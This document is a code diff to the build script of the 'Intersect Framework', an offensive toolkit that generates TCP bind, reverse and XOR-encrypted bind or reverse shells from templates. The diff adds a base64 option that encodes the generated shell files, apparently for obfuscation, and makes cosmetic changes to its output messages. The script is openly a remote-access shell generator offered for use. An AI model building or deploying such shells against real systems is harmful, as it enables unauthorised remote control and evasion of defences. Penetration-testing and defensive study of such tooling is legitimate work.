@@ -1,15 +1,13 @@
 #!/usr/bin/python
-
-# Intersect Framework
+# Intersect Framework (c) 2012
 # Server-side shell generation
-
 # usage: ./build.py --type=tcpbind --host=192.168.1.4 --port=4444 --name=newshell
 
 import sys, os
 import argparse
 import shutil
 import logging
-
+import base64
 
 Templates = ("src/Templates/remote/")
 Scripts = ("Scripts/")
@@ -45,8 +43,8 @@ def main():
             makeshell.write("\naccept()")
             os.system("chmod u+x %s" % Scripts+args.name)
             logging.info("TCP bind shell created. %s:%s %s" % (args.address, args.port, args.name))
-            print("New shell created!")
-            print("Location: %s" % Scripts+args.name)
+            print("[*] New shell created!")
+            print("    Location: %s" % Scripts+args.name)
         
         elif args.type == "tcprev":
             template = (Templates+"tcprev.py")
@@ -59,8 +57,8 @@ def main():
             makeshell.close()
             os.system("chmod u+x %s" % Scripts+args.name)
             logging.info("TCP reverse shell created. %s:%s %s" % (args.address, args.port, args.name))
-            print("New shell created!")
-            print("Location: %s" % Scripts+args.name)
+            print("[*] New shell created!")
+            print("    Location: %s" % Scripts+args.name)
 
         elif args.type == "xorbind":
             if args.key is None:
@@ -80,8 +78,8 @@ def main():
                 makeshell.close()
                 os.system("chmod u+x %s" % Scripts+args.name)
                 logging.info("TCP XOR bind shell created. %s:%s %s" % (args.address, args.port, args.name))
-                print("New shell created!")
-                print("Location: %s" % Scripts+args.name)
+                print("[*] New shell created!")
+                print("    Location: %s" % Scripts+args.name)
                     
         elif args.type == "xorrev":
             if args.key is None:
@@ -99,19 +97,31 @@ def main():
                 makeshell.close()
                 os.system("chmod u+x %s" % Scripts+args.name)
                 logging.info("TCP XOR reverse shell created. %s:%s %s" % (args.address, args.port, args.name))
-                print("New shell created!")
-                print("Location: %s" % Scripts+args.name)
+                print("[*] New shell created!")
+                print("    Location: %s" % Scripts+args.name)
 
 
 help = """Quickly create an Intersect server-side shell.
 Specify the shell type, host and port information and a name for your new shell."""
 
-parser = argparse.ArgumentParser(description=help)
+parser = argparse.ArgumentParser(description=help, prog="build")
 parser.add_argument('--address', help='IP address for listen or bind shell', required=True)
 parser.add_argument('--port', help='Port for listen or bind shell.', required=True, type=int)
 parser.add_argument('--type', help='Type of shell.', required=True, choices=["tcpbind", "tcprev", "xorbind", "xorrev"])
 parser.add_argument('--name', help='Filename new shell will be saved as.', required=True)
 parser.add_argument('--key', help='XOR private key')
+parser.add_argument('--b64', help='base64 encode', action='store_true')
 
 args = parser.parse_args()
 main()
+
+if args.b64 is True:
+    plain = open(Scripts+args.name, "r")
+    base = open(Scripts+args.name+"_b64", "w")
+    print("[*] Encoding shell with base64...")
+    for lines in plain.readlines():
+        enc = base64.b64encode(lines)
+        base.write(enc)
+    print("[*] Encoding complete!")
+    print("    Location: %s" % Scripts+args.name+"_b64")
+    sys.exit(0)
